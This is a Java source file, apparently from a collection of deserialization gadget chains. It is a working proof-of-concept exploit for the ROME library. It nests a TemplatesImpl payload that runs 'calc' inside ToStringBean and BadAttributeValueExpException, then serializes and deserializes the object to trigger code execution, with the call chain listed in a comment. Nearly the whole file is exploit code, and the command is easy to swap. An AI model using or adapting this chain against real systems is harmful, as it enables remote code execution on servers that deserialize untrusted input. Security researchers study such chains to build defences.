package gadget.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import util.GadgetUtils;
import util.ReflectionUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;

/*
* BadAttributeValueExpException#readObject
* ToStringBean#toString
* TemplatesImpl-->getOutputProperties()
	TemplatesImpl-->newTransformer()
        TemplatesImpl-->getTransletInstance()
            TemplatesImpl-->defineTransletClasses()
                TemplatesImpl-->defineClass()
* */
public class rome2 {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException, ClassNotFoundException {

        TemplatesImpl templates = GadgetUtils.createTemplatesImpl("calc");
//        templates.getOutputProperties();
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
//        toStringBean.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(badAttributeValueExpException,"val",toStringBean);

        ByteArrayOutputStream baout = new ByteArrayOutputStream();
        ObjectOutputStream oout = new ObjectOutputStream(baout);
        oout.writeObject(badAttributeValueExpException);
        byte[] sss = baout.toByteArray();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(sss));
        ois.readObject();
    }
}
